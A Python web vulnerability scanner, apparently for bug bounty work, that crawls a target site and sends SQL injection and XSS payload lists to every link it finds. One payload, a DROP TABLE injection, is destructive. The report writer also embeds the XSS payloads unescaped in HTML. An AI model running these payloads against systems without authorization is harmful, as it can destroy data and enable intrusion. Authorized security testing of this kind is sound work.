import requests
import threading
import argparse
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import os

# Setup logging
logging.basicConfig(filename='scan_report.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Enhanced list of test payloads
sql_injection_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1--"
]
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

# Function to test for SQL Injection
def test_sql_injection(url, payload):
    try:
        response = requests.get(url, params={'q': payload}, timeout=10)
        if "sql syntax" in response.text.lower() or "you have an error in your sql syntax" in response.text.lower():
            logging.info(f"Possible SQL Injection vulnerability found with payload: {payload}")
            print(f"Possible SQL Injection vulnerability found with payload: {payload}")
        else:
            logging.info(f"No SQL Injection vulnerability found with payload: {payload}")
    except requests.RequestException as e:
        logging.error(f"Error testing SQL Injection with payload {payload}: {e}")

# Function to test for XSS
def test_xss(url, payload):
    try:
        response = requests.get(url, params={'q': payload}, timeout=10)
        if payload in response.text:
            logging.info(f"Possible XSS vulnerability found with payload: {payload}")
            print(f"Possible XSS vulnerability found with payload: {payload}")
        else:
            logging.info(f"No XSS vulnerability found with payload: {payload}")
    except requests.RequestException as e:
        logging.error(f"Error testing XSS with payload {payload}: {e}")

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description='Automated Bug Bounty Scanner')
    parser.add_argument('url', type=str, help='Target URL to scan')
    parser.add_argument('--login-url', type=str, help='Login URL for authenticated scans')
    parser.add_argument('--username', type=str, help='Username for login')
    parser.add_argument('--password', type=str, help='Password for login')
    return parser.parse_args()

# Function to validate URL
def validate_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ("http", "https") and bool(parsed.netloc)

# Function to login and create a session
def login(login_url, username, password):
    session = requests.Session()
    login_payload = {'username': username, 'password': password}
    session.post(login_url, data=login_payload)
    return session

# Function to discover URLs
def discover_urls(base_url, session):
    urls = set()
    try:
        response = session.get(base_url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            url = urljoin(base_url, link['href'])
            if validate_url(url):
                urls.add(url)
    except requests.RequestException as e:
        logging.error(f"Error discovering URLs on {base_url}: {e}")
    return urls

# Function to generate HTML report
def generate_report():
    with open('scan_report.log', 'r') as log_file:
        logs = log_file.readlines()
    with open('scan_report.html', 'w') as report_file:
        report_file.write('<html><body><h1>Scan Report</h1><pre>')
        report_file.writelines(logs)
        report_file.write('</pre></body></html>')

# Main function to run tests
def main():
    args = parse_args()
    target_url = args.url

    if not validate_url(target_url):
        print("Invalid URL. Please provide a valid URL starting with http:// or https://")
        return

    print("Starting scan...")
    logging.info(f"Starting scan on {target_url}")

    session = requests.Session()
    if args.login_url and args.username and args.password:
        session = login(args.login_url, args.username, args.password)

    urls = discover_urls(target_url, session)

    threads = []

    for url in urls:
        print(f"Testing for SQL Injection on {url}...")
        for payload in sql_injection_payloads:
            thread = threading.Thread(target=test_sql_injection, args=(url, payload))
            threads.append(thread)
            thread.start()

        print(f"Testing for XSS on {url}...")
        for payload in xss_payloads:
            thread = threading.Thread(target=test_xss, args=(url, payload))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

    print("Scan completed. Generating report...")
    logging.info("Scan completed.")
    generate_report()
    print("Report generated: scan_report.html")

if __name__ == "__main__":
    main()
